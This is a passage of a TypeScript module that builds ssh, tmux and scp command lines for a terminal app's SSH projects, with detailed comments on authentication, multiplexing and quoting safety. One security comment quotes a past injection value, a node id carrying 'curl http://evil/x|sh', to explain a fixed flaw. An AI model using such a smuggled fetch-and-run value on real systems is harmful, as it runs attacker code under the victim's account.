// Pure ssh/tmux argv + remote-command builders for SSH projects. No electron/node-pty imports
// — unit-testable in isolation. The electron/spawn wiring lives in ssh-project.ts + pty-manager.
import os from 'os'
import path from 'path'
import { createHash } from 'crypto'
import { posixQuote, quoteRemotePath, remoteTmuxCommand, type SshConnection } from '../../shared/ssh'
import {
  TMUX_SOCKET,
  assertFramedPayload,
  assertPasteTarget,
  assertPasteBuffer,
  pasteBufferName,
  type PasteDelivery
} from '../tmux-naming'
import { sanitizePasteText } from '../paste-injection'
import { canControlCanvas } from '../../shared/agents/config'
import { PANE_OWNER_FMT, foregroundArgvArgs } from '../agents/pane-owner'
// Dependency-free (no node-pty): safe to import from these pure builders.

/** Dedicated remote tmux socket so an SSH project never collides with the user's own tmux. */
export const RMT_TMUX_SOCKET = 'nodeterm-rmt'

/**
 * Per-project ControlMaster socket path. Deliberately SHORT and space-free. The macOS userData dir
 * (`~/Library/Application Support/<app>`) cannot host the socket: it both exceeds the unix-domain
 * socket `sun_path` limit (104 bytes — and ssh appends a ~17-char temp suffix while binding the
 * master, pushing a ~102-char path over) AND contains a space, which ssh's `-o ControlPath=` parser
 * rejects ("extra arguments at end of line"). Either makes the master silently fail to bind. So we
 * hash the project id to a fixed length under a short home dir (`~/.nodeterm/ssh-cm/`) — the master
 * socket then always binds, regardless of project id or platform userData location.
 */
export function controlPathFor(projectId: string): string {
  const id = createHash('sha256').update(projectId).digest('hex').slice(0, 16)
  return path.join(os.homedir(), '.nodeterm', 'ssh-cm', `${id}.sock`)
}

function target(conn: SshConnection): string {
  return `${conn.user}@${conn.host}`
}

function portArgs(conn: SshConnection): string[] {
  return ['-p', String(conn.port ?? 22)]
}

/**
 * `IdentitiesOnly=yes` + `-i` when the connection names a key, nothing otherwise. The pairing
 * exists because of `AddKeysToAgent` (masterArgs): an agent accumulates keys, and without
 * IdentitiesOnly ssh offers EVERY agent key before the configured one. Each rejected offer spends
 * one of the server's `MaxAuthTries` (default 6), so a well-stocked agent ended the connection
 * with "Too many authentication failures" before the configured key was ever offered (measured
 * against a real sshd: 8 junk agent keys plus `-i` = disconnected; the same with IdentitiesOnly
 * connects). IdentitiesOnly does NOT bypass the agent for the named key: ssh still has the agent
 * sign it, so the no-reprompt behavior survives (measured: askpass removed entirely, agent
 * holding the key, zero prompts). With NO configured key this must stay empty, because
 * IdentitiesOnly would then disable agent keys outright and break the very reconnect path
 * AddKeysToAgent provides.
 */
function identityArgs(conn: SshConnection): string[] {
  return conn.identityFile ? ['-o', 'IdentitiesOnly=yes', '-i', conn.identityFile] : []
}

/** Args for the backgrounded multiplexing master (the one auth happens here). */
export function masterArgs(conn: SshConnection, controlPath: string): string[] {
  const args = [
    '-M',
    '-N',
    '-o',
    'ControlMaster=auto',
    '-o',
    `ControlPath=${controlPath}`,
    '-o',
    'ControlPersist=300',
    '-o',
    'BatchMode=no',
    // Unknown host → record it and connect, instead of aborting. The master is backgrounded
    // (`-M -N`, no tty), so the default `StrictHostKeyChecking=ask` can never get its yes/no
    // answered and the whole connection fails — the "server not in known_hosts" error users hit.
    // `accept-new` auto-accepts a FIRST-SEEN host key (writing it to known_hosts) but STILL
    // refuses a host whose recorded key later CHANGED, so MITM protection on known hosts stays.
    '-o',
    'StrictHostKeyChecking=accept-new',
    // Keepalives on the ONE connection every terminal multiplexes over: keep NAT/firewall
    // entries warm, and detect a dead link in ~60s (15s × 4) instead of hanging half-dead
    // after sleep/wake or a network change. The client then exits 255 and the renderer's
    // SshReconnector takes over.
    '-o',
    'ServerAliveInterval=15',
    '-o',
    'ServerAliveCountMax=4',
    // Bound the TCP-connect phase. connect() waits on the master PROCESS for keyed connections
    // (a passphrase prompt can take minutes), so a black-holed TCP connect must fail through ssh
    // itself rather than ride that long window for the kernel's ~75s of SYN retries. Auth,
    // including the passphrase prompt, is not covered by ConnectTimeout, so no slow human is
    // ever cut off by this.
    '-o',
    'ConnectTimeout=15',
    // The master has no tty, so it can never complete password or keyboard-interactive auth: the
    // best it can do is submit an EMPTY credential, which OpenSSH does silently, once per allowed
    // prompt. Every connect against a password-auth host therefore produced several FAILED logins,
    // and because the app retries on its own timers (reconnector backoff, 45s watchdog, resume,
    // tab switches) a single evening was enough to trip the host's own fail2ban and lock the user
    // out with "Connection closed by <host>". Refusing both methods up front means the master
    // fails honestly on publickey alone and never spends a login attempt it cannot win.
    //
    // Do NOT express this as `NumberOfPasswordPrompts=0`: that counter also bounds the KEY
    // PASSPHRASE retry loop in OpenSSH's load_identity_file, so zero means an encrypted key is
    // tried once with an empty passphrase and then abandoned WITHOUT ever invoking SSH_ASKPASS.
    // It silently disables passphrase prompting altogether, which an end-to-end test against a
    // real sshd caught and no unit test could.
    '-o',
    'PasswordAuthentication=no',
    '-o',
    'KbdInteractiveAuthentication=no',
    // Load a successfully unlocked key into the agent named by SSH_AUTH_SOCK. An AGENT, not this
    // app, is the passphrase cache: the next master (reconnect, watchdog respawn) authenticates
    // through it and never re-prompts (measured against a real sshd: second connect, fresh master,
    // zero askpass invocations, even with SSH_ASKPASS removed), and the decrypted key sits in a
    // purpose-built process instead of a plaintext string in Electron main memory — which is why
    // the old in-app passphrase cache was deleted in its favor.
    //
    // WHICH agent is the app's choice, and it is not the user's: main points SSH_AUTH_SOCK at an
    // app-private agent it spawns and kills (src/main/remote-ssh/ssh-agent.ts), so the unlock is
    // scoped to one app run instead of living in the login agent until logout. Read that file
    // before assuming a key unlocked here survives a quit.
    //
    // Harmless when no agent is reachable at all: ssh skips the add silently (measured: not one
    // stderr line, so nothing for lastSshErrorLine to mistake for a failure cause) and simply
    // prompts again next time.
    '-o',
    'AddKeysToAgent=yes',
    ...portArgs(conn),
    ...identityArgs(conn)
  ]
  args.push(target(conn))
  return args
}

/**
 * Args for a child ssh that reuses the master socket; `remote` is an optional remote command.
 *
 * `ControlMaster=auto`, NOT `no` — this is the self-heal half of the churn fix. With a live
 * master both behave identically (the child muxes over the socket, no new TCP/auth). But when
 * the master is gone and its socket file is absent, `no` made every child SILENTLY fall back to
 * a fresh direct connection — one full TCP+auth+close per poll (~2-3/s while the app is open;
 * a field report counted ~72k root logins in 24h on one host), invisible because everything
 * kept working. With `auto` + `ControlPersist`, the FIRST such child rebuilds a persistent
 * background master and every later child muxes over it. A leftover DEAD socket file still
 * blocks `auto` from binding (ssh refuses: "ControlSocket … already exists, disabling
 * multiplexing" → direct fallback), which is what the manager's watchdog exists for
 * (`ssh-project.ts` — periodic `-O check`, unlink stale socket, respawn master).
 */
export function childArgs(conn: SshConnection, controlPath: string, remote?: string): string[] {
  const args = [
    '-o',
    'ControlMaster=auto',
    '-o',
    `ControlPath=${controlPath}`,
    '-o',
    'ControlPersist=300',
    // Matters when this child is the one that actually touches the host (it became the master, or
    // fell back to a direct connection because the master was gone): a first-seen host key must be
    // recorded and accepted rather than abort a backgrounded, tty-less exec. See masterArgs.
    '-o',
    'StrictHostKeyChecking=accept-new',
    // Meaningful only when this child ends up owning the transport (became the master, or fell
    // back to a direct connection) — a mux client rides the master's keepalives. Same values as
    // masterArgs, for the same reason: detect a dead link in ~60s instead of hanging half-dead.
    '-o',
    'ServerAliveInterval=15',
    '-o',
    'ServerAliveCountMax=4',
    ...portArgs(conn)
  ]
  // The key matters exactly when mux is NOT available (fallback / becoming master) — the case
  // the old childArgs ignored: with a non-default identityFile every fallback exec failed auth.
  // identityArgs also pins the offer (IdentitiesOnly) so that same fallback cannot burn the
  // server's MaxAuthTries on unrelated agent keys; the agent still signs the pinned key, which
  // is the only way a tty-less child can use an ENCRYPTED key at all (it has no askpass wiring).
  args.push(...identityArgs(conn))
  args.push(target(conn))
  if (remote !== undefined) args.push(remote)
  return args
}

export function checkMasterArgs(conn: SshConnection, controlPath: string): string[] {
  return ['-O', 'check', '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
export function exitMasterArgs(conn: SshConnection, controlPath: string): string[] {
  return ['-O', 'exit', '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
export function remoteTmuxHasSessionArgs(conn: SshConnection, controlPath: string, sessionId: string): string[] {
  return childArgs(conn, controlPath, `tmux -L ${RMT_TMUX_SOCKET} has-session -t ${sessionId}`)
}
/**
 * Every nodeterm tmux session on the host, by name.
 *
 * The host's own session list is the DURABLE record of which nodes run there. Our live pty map is
 * not: `PtyManager.kill()` forgets a session on detach, so a backgrounded project's nodes vanish
 * from it entirely — which is exactly the state the reconnect resync runs in. `list-sessions`
 * exits non-zero when no server is running; the caller reads that as "no sessions", not an error.
 * The format is single-quoted so `#{…}` reaches the remote tmux verbatim rather than being eaten
 * by the remote shell (same idiom as `remotePaneCommandArgs`).
 */
export function remoteListSessionsArgs(conn: SshConnection, controlPath: string): string[] {
  return childArgs(
    conn,
    controlPath,
    `tmux -L ${RMT_TMUX_SOCKET} list-sessions -F '#{session_name}'`
  )
}

/** One session name per non-empty line. */
export function parseRemoteSessionNames(stdout: string): string[] {
  return stdout
    .split('\n')
    .map((line) => line.trim())
    .filter((line) => line.length > 0)
}

/**
 * Deliver text (and optionally Enter) into a node's REMOTE tmux session — the remote counterpart
 * of `PtyManager.sendText`'s local path (dictation insert, /rename, /branch, note pushes). ONE
 * remote command, so everything runs strictly in order on the remote host with no second network
 * round trip.
 *
 * THE TEXT IS NOT IN THIS ARGV. It rides the ssh child's STDIN into `tmux load-buffer -b … -`.
 * Two reasons, and both of them bit the previous version:
 *
 *  - ARG_MAX. `set-buffer -- "$text"` / `send-keys -l -- '<text>'` puts the whole payload in one
 *    argument, and a single argument is capped at MAX_ARG_STRLEN (128 KB). Measured locally: a
 *    300 KB payload dies with "Argument list too long"; the same payload through `load-buffer -`
 *    lands intact. A scrollback paste or a long note push is not a hypothetical size.
 *  - This repo's standing rule: no payload on a command line. It also retires the `posixQuote`
 *    of an attacker-influenced body into a remote shell line entirely — there is nothing left to
 *    quote.
 *
 * FRAMING is tmux's job now, not ours. See `localTmuxPasteArgs` for the whole measurement: the
 * old `#{bracket_paste_flag}` conditional needed tmux 3.7 on the REMOTE host and silently
 * degraded to a raw-newline mangle on every older one, while `paste-buffer -p` has consulted the
 * pane's real bracketed-paste state since tmux 1.7 (2012). The remote host's tmux version stops
 * being something this feature depends on.
 *
 * `sanitizePasteText` still runs — at the CALLER (`PtyManager.sendText`), once, for both paths,
 * on the bytes that go down stdin. tmux inserting the frame does not make a payload-supplied
 * `ESC[201~` harmless: it would still close the frame early and turn the rest into key input.
 *
 * The `#{pane_in_mode}` format and the inner `send-keys` command string are single-quoted so the
 * remote SHELL passes them through verbatim — `#…` at the start of a word is a comment to sh, and
 * the inner command is one tmux argument. `sessionId` is spliced unquoted, exactly as every
 * sibling builder here does, and that is safe only because `sessionName()` sanitises to
 * `[A-Za-z0-9_-]`; `localTmuxPasteArgs` asserts it for both paths (`assertPasteTarget`).
 */
export function remoteTmuxPasteArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  buffer: string,
  enter: boolean
): string[] {
  assertPasteTarget(sessionId, buffer)
  const tmux = `tmux -L ${RMT_TMUX_SOCKET}`
  let cmd =
    `${tmux} load-buffer -b ${buffer} - ';' ` +
    `if-shell -F -t ${sessionId} '#{pane_in_mode}' 'send-keys -t ${sessionId} -X cancel' ';' ` +
    `paste-buffer -d -p -r -b ${buffer} -t ${sessionId}`
  if (enter) cmd += ` ';' send-keys -t ${sessionId} Enter`
  return childArgs(conn, controlPath, cmd)
}

/**
 * The remote leg of the messaging envelope's delivery — `remoteFramedDelivery`'s argv. The exact
 * mirror of `localTmuxFramedPasteArgs` (tmux-naming.ts): NO `-p`, because the payload already
 * carries its frame and tmux re-framing it would render the inner markers as garbage; `-r` so the
 * bytes land verbatim; no trailing Enter, because the composed `\r` rides inside the paste.
 */
export function remoteTmuxFramedPasteArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  buffer: string
): string[] {
  assertPasteTarget(sessionId, buffer)
  const tmux = `tmux -L ${RMT_TMUX_SOCKET}`
  const cmd =
    `${tmux} load-buffer -b ${buffer} - ';' ` +
    `if-shell -F -t ${sessionId} '#{pane_in_mode}' 'send-keys -t ${sessionId} -X cancel' ';' ` +
    `paste-buffer -d -r -b ${buffer} -t ${sessionId}`
  return childArgs(conn, controlPath, cmd)
}

/**
 * The plan for delivering one composed frame remotely — same three decisions as
 * `localFramedDelivery`, taken by the SAME `assertFramedPayload` rather than restated: this is the
 * one plan pair that does not sanitize (the frame's ESC bytes must survive), so it refuses
 * anything that is not `bracketedInjection` output. No bare-Enter case: an envelope is never
 * empty, and a lone Enter into an agent's composer is an accidental submit.
 */
export function remoteFramedDelivery(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  payload: string
): PasteDelivery | null {
  if (payload.length === 0) return null
  assertFramedPayload(payload)
  const buffer = pasteBufferName()
  return {
    args: remoteTmuxFramedPasteArgs(conn, controlPath, sessionId, buffer),
    body: payload,
    cleanup: remoteDeleteBufferArgs(conn, controlPath, buffer)
  }
}

/**
 * A bare Enter into the remote pane — the remote half of `sendText`'s empty-payload case.
 *
 * It is not a special case invented here: `sendText('', { enter: true })` means "submit whatever
 * is composed", and the legacy two-step did exactly this (an empty literal send is a no-op, then
 * the Enter). It has to bypass `remoteTmuxPasteArgs` because `load-buffer -` given zero bytes
 * creates NO buffer, so the `paste-buffer` after it fails and tmux abandons the rest of the
 * command list — including the Enter. Measured.
 *
 * `sessionId` is spliced unquoted like every sibling, and — as of review — asserted like every
 * sibling. It was the one new builder in this change that opted out. Unreachable today, because
 * `sessionName()` sanitises to `[A-Za-z0-9_-]` before anything gets here, but a splice that is
 * safe only because some caller upstream happens to be strict is one refactor from an injection,
 * and this PR's own rule is that the guarantee lives at the splice.
 */
export function remoteTmuxEnterArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  assertPasteTarget(sessionId)
  return childArgs(conn, controlPath, `tmux -L ${RMT_TMUX_SOCKET} send-keys -t ${sessionId} Enter`)
}

/** `delete-buffer` on the REMOTE server — the sweep for a remote paste that never ran. */
export function remoteDeleteBufferArgs(
  conn: SshConnection,
  controlPath: string,
  buffer: string
): string[] {
  assertPasteBuffer(buffer)
  return childArgs(conn, controlPath, `tmux -L ${RMT_TMUX_SOCKET} delete-buffer -b ${buffer}`)
}

/**
 * The plan for a REMOTE delivery — the exact mirror of `localPasteDelivery`, and deliberately the
 * same three decisions (sanitize, empty body, per-call buffer) taken by calling the SAME code
 * rather than by writing them out again here. Drift between the two legs is how the ESC rule
 * survived being missing on one of them once already.
 */
export function remotePasteDelivery(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  text: string,
  enter: boolean
): PasteDelivery | null {
  const body = sanitizePasteText(text)
  if (body.length === 0) {
    if (!enter) return null
    return { args: remoteTmuxEnterArgs(conn, controlPath, sessionId), body: '', cleanup: null }
  }
  const buffer = pasteBufferName()
  return {
    args: remoteTmuxPasteArgs(conn, controlPath, sessionId, buffer, enter),
    body,
    cleanup: remoteDeleteBufferArgs(conn, controlPath, buffer)
  }
}
/**
 * Did a FAILED `tmux has-session` probe actually say the session is absent? Only tmux's own
 * exit 1 ("can't find session" / "no server running") does. Anything else — ssh's 255 (a dead
 * or mid-reconnect ControlMaster), 127 (tmux off the remote PATH), a spawn error with no
 * numeric code — is a failed READ, and a failed read is never evidence of absence. Reading a
 * transport failure as "cold" made the desktop replay scrollback and type `claude --resume …`
 * into a LIVE fullscreen Claude session; the mangled line then landed in the agent's
 * conversation as a user prompt (field report). Unknown ⇒ warm attach, which types nothing.
 */
export function probeSaysAbsent(err: unknown): boolean {
  return (err as { code?: unknown } | null)?.code === 1
}
/**
 * Every tmux socket a nodeterm session can be living on, on ONE machine — used when we are asked to
 * end a session by NAME and do not know which socket holds it.
 *
 * Both exist on the same host all the time: `node-terminal` is what a nodeterm running ON that
 * machine uses (desktop or Server Edition), `nodeterm-rmt` is what a nodeterm SSH-ing INTO it uses.
 * The session-memory sweep lists both (`session-memory.ts`, `session-memory-remote.ts`) — so a kill
 * that only ever targeted one of them promised something it could not do for every row that came
 * off the other. That is not exotic: a host that runs its own `nodeterm-server` and is also SSH'd
 * into is exactly this shape.
 *
 * Deliberately NOT the same constant the sweep and the reaper use, even though it holds the same two
 * names: for THEM the order is load-bearing (the sweep's `bySession` is first-wins, so the order
 * decides which socket a duplicate name is attributed to), and for a kill it means nothing. Sharing
 * one array would silently couple a de-duplication preference to a kill list.
 */
export const KILL_TMUX_SOCKETS: readonly string[] = [TMUX_SOCKET, RMT_TMUX_SOCKET]

/**
 * Which local sockets a destroy must attempt.
 *
 * `liveSocket` is the socket of the session we actually HOLD, which we know is the right one: one
 * kill, and the fan-out below can never reach the ordinary path.
 *
 * With no live session the name is all we have, and then it depends on who is asking:
 *  - `everySocket: false` (the default, and every ordinary caller) → the local socket only. An
 *    ordinary node-× on a node that was never mounted in THIS process — the common case after an
 *    app restart — has no business speculating at `nodeterm-rmt`, which carries the sessions
 *    ANOTHER machine's nodeterm SSHed in to spawn here.
 *  - `everySocket: true` → every socket the name could be on. Only the session-memory panel's
 *    speculative kill asks for this, and it is the one caller that has earned it: the panel sweeps
 *    BOTH sockets, so an orphan row genuinely can be on either, and a kill aimed at one of them
 *    showed a confirm reading "this stops its tmux session" and then killed nothing at all.
 */
export function localKillSockets(
  liveSocket: string | null,
  everySocket = false
): readonly string[] {
  if (liveSocket) return [liveSocket]
  return everySocket ? KILL_TMUX_SOCKETS : [TMUX_SOCKET]
}

/**
 * `=` forces tmux to match the target EXACTLY. Without it tmux falls back to fnmatch and then to
 * PREFIX matching when the name is not found — and "not found" is the normal case for every kill we
 * fire speculatively at a socket. Node ids end in a counter (`term-<base36 ms>-1`), so `nt-…-1` is a
 * prefix of `nt-…-12`: a miss could kill a DIFFERENT session. The reaper already kills this way
 * (`session-budget.ts`) for the same reason.
 */
function exactTarget(sessionId: string): string {
  return `=${sessionId}`
}

/** Local `tmux kill-session` argv (the binary is resolved by the caller). */
export function localTmuxKillArgs(socket: string, sessionId: string): string[] {
  return ['-L', socket, 'kill-session', '-t', exactTarget(sessionId)]
}

export function remoteTmuxKillArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  socket: string = RMT_TMUX_SOCKET
): string[] {
  return childArgs(conn, controlPath, `tmux -L ${socket} kill-session -t ${exactTarget(sessionId)}`)
}

/**
 * One kill per socket, for a caller that knows only the session NAME and does not know which socket
 * carries it — i.e. `SshProjectManager.killSessions({ everySocket: true })`, which is the
 * session-memory panel's route. Project deletion does NOT use this: it knows its own nodes, they
 * are all on the SSH project's own socket, and speculating at the host's `node-terminal` would aim
 * at sessions a nodeterm running ON that host owns.
 *
 * Best-effort by contract: tmux exits non-zero with "can't find session" on every socket that does
 * not hold it, and that is an expected, ignored outcome rather than a failure.
 */
export function remoteTmuxKillEverySocketArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[][] {
  return KILL_TMUX_SOCKETS.map((socket) => remoteTmuxKillArgs(conn, controlPath, sessionId, socket))
}
export function remoteCapturePaneArgs(conn: SshConnection, controlPath: string, sessionId: string, full: boolean): string[] {
  return childArgs(
    conn,
    controlPath,
    `tmux -L ${RMT_TMUX_SOCKET} capture-pane -p -e -t ${sessionId} -S ${full ? '-' : '-200'}`
  )
}
/**
 * Ask the REMOTE tmux which command is in the foreground of a node's pane — the remote
 * counterpart of `PtyManager.paneCommand`'s local `display-message` path. The format is
 * single-quoted so `#{…}` survives the remote shell verbatim (same idiom as the
 * `#{pane_in_mode}` gate in `remoteTmuxPasteArgs`).
 */
export function remotePaneCommandArgs(conn: SshConnection, controlPath: string, sessionId: string): string[] {
  return childArgs(
    conn,
    controlPath,
    `tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '#{pane_current_command}'`
  )
}

/** Ask remote tmux for the shell PID and current command as one parseable, bounded record. */
export function remotePaneProcessArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  return childArgs(
    conn,
    controlPath,
    `tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '#{pane_pid}|#{pane_current_command}'`
  )
}

/**
 * SIGTERM the remote pane's foreground process group, after core has already confirmed tmux is
 * reporting an agent rather than a shell. The shell re-reads tpgid here to close the process-race
 * window and refuses its own group (`panePid`) before invoking kill.
 */
export function remoteTerminateForegroundArgs(
  conn: SshConnection,
  controlPath: string,
  panePid: number
): string[] {
  if (!Number.isSafeInteger(panePid) || panePid <= 0) {
    throw new Error('invalid-pane-pid')
  }
  return childArgs(
    conn,
    controlPath,
    `tpgid=$(ps -o tpgid= -p ${panePid} | tr -d '[:space:]') && ` +
      `case "$tpgid" in ''|*[!0-9]*) exit 1;; esac && ` +
      `[ "$tpgid" -gt 0 ] && [ "$tpgid" -ne ${panePid} ] && kill -TERM -- "-$tpgid"`
  )
}
/**
 * Ask the REMOTE tmux for everything the ownership read needs in one round-trip — the remote
 * counterpart of `PtyManager.paneOwner`'s first call. Same single-quoting rule as
 * `remotePaneCommandArgs`: the `#{…}` fields have to reach the remote tmux verbatim rather than
 * being eaten by the remote shell.
 */
export function remotePaneOwnerArgs(conn: SshConnection, controlPath: string, sessionId: string): string[] {
  return childArgs(
    conn,
    controlPath,
    `tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '${PANE_OWNER_FMT}'`
  )
}

/**
 * The second round-trip: `ps` on the REMOTE host, listing the pane tty's processes.
 *
 * `tty` is a value the remote host printed back at us (`#{pane_tty}`), so it is DATA crossing into
 * a command line — exactly the class `remote-safety.ts` exists for. Two layers, both required:
 * `isSafeTty` refuses anything outside `[A-Za-z0-9/._-]` (returning null here, which the caller
 * reads as "unknown"), and what survives is `posixQuote`d at the splice. No credential is involved
 * — a tty path is the whole payload — so nothing here needs, or may grow, a stdin header channel
 * (Global Constraint 6).
 *
 * The `ps` flags are the ones measured for the local leg, unchanged: they are valid on both GNU and
 * BSD `ps`, and the remote host is at least as likely to be either.
 */
export function remoteForegroundArgvArgs(
  conn: SshConnection,
  controlPath: string,
  tty: string
): string[] | null {
  const call = foregroundArgvArgs(tty)
  if (!call) return null
  return childArgs(conn, controlPath, `${call.bin} ${call.args.map(posixQuote).join(' ')}`)
}

/**
 * Ask the REMOTE tmux where a pane's cursor is — the remote counterpart of `PtyManager.paneCursor`,
 * and the thing that makes a refreshed SSH terminal land its cursor in the right place. Same
 * single-quoting rule as `remotePaneCommandArgs`: the `#{…}` fields have to reach the remote tmux
 * verbatim rather than being eaten by the remote shell. Space-separated so one `split` parses it.
 */
export function remotePaneCursorArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  return childArgs(
    conn,
    controlPath,
    `tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '#{cursor_x} #{cursor_y} #{cursor_flag}'`
  )
}
export function tmuxProbeArgs(conn: SshConnection, controlPath: string): string[] {
  return childArgs(conn, controlPath, 'command -v tmux')
}
export function listDirArgs(conn: SshConnection, controlPath: string, path: string): string[] {
  return childArgs(conn, controlPath, `ls -1Ap ${quoteRemotePath(path)}`)
}

/** Create a remote directory (and any missing parents). `quoteRemotePath` keeps a leading `~`. */
export function mkDirArgs(conn: SshConnection, controlPath: string, path: string): string[] {
  return childArgs(conn, controlPath, `mkdir -p ${quoteRemotePath(path)}`)
}

/** scp argv that reuses the project's ControlMaster. `localPath` is a raw local arg; the absolute
 *  `remotePath` is passed RAW (NOT posixQuote'd). Modern scp (OpenSSH 9+) uses the SFTP protocol by
 *  default and does NOT run the remote path through a shell — it opens the literal string after the
 *  `host:`, so a quoted path makes the SFTP server look for a file literally named `'…'` (the upload
 *  then silently fails). Leaving it raw means SFTP opens the exact absolute path (spaces and all);
 *  there is no remote shell, so no quoting is needed and no injection is possible (`fileName` is also
 *  basenamed by the caller, and the path is absolute). scp uses `-P` (uppercase) for the port. */
export function scpArgs(conn: SshConnection, controlPath: string, localPath: string, remotePath: string): string[] {
  const args = ['-o', 'ControlMaster=no', '-o', `ControlPath=${controlPath}`, '-o', 'BatchMode=yes', '-P', String(conn.port ?? 22)]
  args.push(...identityArgs(conn))
  args.push(localPath, `${conn.user}@${conn.host}:${remotePath}`)
  return args
}

/**
 * The remote side of an scp argument. A `~`-prefixed path (SSH projects default to a home-relative
 * `remoteCwd`, so the Explorer's paths inherit it) must NOT travel as a literal `~`: modern scp
 * speaks SFTP with no remote shell to expand it, and the transfer would fail looking for a
 * directory actually named `~`. A RELATIVE path is the portable answer — SFTP resolves it against
 * the login directory, and legacy (shell-mode) scp lands in the same place.
 */
export function remoteScpPath(p: string): string {
  if (p === '~') return '.'
  return p.startsWith('~/') ? p.slice(2) : p
}

/**
 * scp argv that pulls `remotePath` DOWN to `localPath` over the project's ControlMaster — the
 * mirror of `scpArgs`. `-r` copies a directory tree. Direction is the only real difference: the
 * remote path is still passed raw after `host:` (see scpArgs — quoting it would make the SFTP
 * server look for a literally-quoted name), and it can never be read as an option because it is
 * concatenated behind `user@host:`. `localPath` is built by MAIN (never a renderer string), so
 * the flag-smuggling guard that `uploadFile` needs has no counterpart here.
 */
export function scpDownArgs(
  conn: SshConnection,
  controlPath: string,
  remotePath: string,
  localPath: string,
  recursive = false
): string[] {
  const args = ['-o', 'ControlMaster=no', '-o', `ControlPath=${controlPath}`, '-o', 'BatchMode=yes', '-P', String(conn.port ?? 22)]
  args.push(...identityArgs(conn))
  if (recursive) args.push('-r')
  args.push(`${conn.user}@${conn.host}:${remoteScpPath(remotePath)}`, localPath)
  return args
}

/**
 * Reverse-forward the local hook server's loopback TCP port to a remote unix socket over the
 * existing master (`ssh -O forward -R <remoteSock>:127.0.0.1:<hookPort>`), so remote hook scripts
 * can POST to it via `curl --unix-socket`.
 */
function fwdSpec(remoteSock: string, hookPort: number): string {
  return `${remoteSock}:127.0.0.1:${hookPort}`
}
export function hookForwardArgs(conn: SshConnection, controlPath: string, remoteSock: string, hookPort: number): string[] {
  return ['-O', 'forward', '-R', fwdSpec(remoteSock, hookPort), '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
export function hookForwardCancelArgs(conn: SshConnection, controlPath: string, remoteSock: string, hookPort: number): string[] {
  return ['-O', 'cancel', '-R', fwdSpec(remoteSock, hookPort), '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
/**
 * tmux `-e KEY=VALUE` pairs injecting the remote hook endpoint file + node id + protocol version,
 * plus the agent identity. The identity pair matters: the local path's `hookServer.buildPtyEnv`
 * sets NODETERM_AGENT_ID and gates NODETERM_CANVAS_CONTROL on `canControlCanvas`, and a remote
 * session that inherited neither had the canvas-control CLI disable itself on its own env gate —
 * so the skill was inert on every SSH node even once it was installed there.
 * `agentId` is omitted for plain (non-agent) terminals, which get neither pair.
 */
export function remoteHookEnvArgs(
  endpointPath: string,
  nodeId: string,
  version: string,
  agentId?: string,
  /** Node-persisted harness snapshot; authoritative if the custom definition was deleted. */
  capabilityAgentId?: string
): string[] {
  const env = [
    '-e',
    `NODETERM_HOOK_ENDPOINT=${endpointPath}`,
    '-e',
    `NODETERM_NODE_ID=${nodeId}`,
    '-e',
    `NODETERM_HOOK_VERSION=${version}`
  ]
  if (agentId) {
    env.push('-e', `NODETERM_AGENT_ID=${agentId}`)
    if (canControlCanvas(capabilityAgentId ?? agentId))
      env.push('-e', 'NODETERM_CANVAS_CONTROL=1')
  }
  return env
}
/** Contents of the remote endpoint env file the managed hook script sources (unix-socket transport). */
export function remoteEndpointFileContents(
  sock: string,
  token: string,
  version: string,
  tokenDir: string
): string {
  // Every value is `posixQuote`d for the same reason as the local writer (issue #351): the managed
  // script SOURCES this file under /bin/sh, so an unquoted space or shell metachar in the socket
  // path, token, or token dir would break the source. Remote paths rarely carry spaces, but the
  // token can hold any byte, and the guarantee should not depend on the host's home layout.
  return (
    `NODETERM_HOOK_SOCK=${posixQuote(sock)}\n` +
    `NODETERM_HOOK_TOKEN=${posixQuote(token)}\n` +
    `NODETERM_HOOK_VERSION=${posixQuote(version)}\n` +
    // The REMOTE token dir ($HOME/.nodeterm/node-tokens on the host), not ours. The host stores
    // per-node tokens only; it never holds a secret and can never mint.
    `NODETERM_NODE_TOKEN_DIR=${posixQuote(tokenDir)}\n`
  )
}

/**
 * The remote PTY program is `ssh <childArgs> host -t '<remoteTmuxCommand>'`. `extraEnv` is an
 * already-built list of tmux `-e KEY=VALUE` pairs (e.g. from `remoteHookEnvArgs`) spliced into
 * the `new-session` command right after `-A`, mirroring the local tmux `-e` placement.
 *
 * SECURITY — every token is `posixQuote`d, including the `-e` flags themselves (quoting a flag is
 * a no-op to the shell, and hard-coding "even indices are flags" would be an assumption about a
 * caller's array shape rather than a property of this function). This is NOT decoration: the
 * result is ONE SHELL LINE handed to the remote user's login shell, and the values here carry the
 * RAW node id (`NODETERM_NODE_ID`) and the managed-account config dir — both of which come out of
 * `.nodeterm/project.json`, a file that travels in a cloned or shared repo and is written on
 * remote hosts. Spliced unquoted (as this did until 2026-08), a node id of
 * `n1;curl http://evil/x|sh;#` ended the tmux command and ran the rest as the SSH user the moment
 * the victim opened that node. Everything else in `remoteTmuxCommand` was already quoted; this was
 * the one gap. See control-master.injection.test.ts.
 */
export function remoteTmuxPtyArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  remoteCwd: string,
  program?: string,
  programArgs?: string[],
  extraEnv: string[] = [],
  confPath?: string,
  sessionEnv?: RemoteSessionEnv
): string[] {
  let cmd = remoteTmuxCommand({ sessionId, remoteCwd, program, programArgs, socket: RMT_TMUX_SOCKET, confPath })
  if (extraEnv.length)
    // The replacement is a FUNCTION, not a string. This is load-bearing and not a style choice:
